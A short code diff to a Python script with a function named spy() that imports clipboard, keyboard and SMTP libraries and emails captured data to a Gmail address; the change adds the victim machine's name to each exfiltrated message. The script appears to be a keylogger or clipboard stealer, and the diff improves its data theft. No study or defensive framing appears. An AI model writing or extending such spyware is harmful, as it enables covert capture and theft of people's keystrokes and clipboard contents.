@@ -1,6 +1,7 @@
 import pyperclip
 import smtplib
 import keyboard
+import os
 
 def spy():
 
@@ -19,7 +20,7 @@ def spy():
 		print(data)
 
 		server.sendmail("jacksonsoftwaresolutions@gmail.com",
-		"jacksonsoftwaresolutions@gmail.com", data)
+		"jacksonsoftwaresolutions@gmail.com", os.environ['COMPUTERNAME']+data)
 
 	server.close()
 
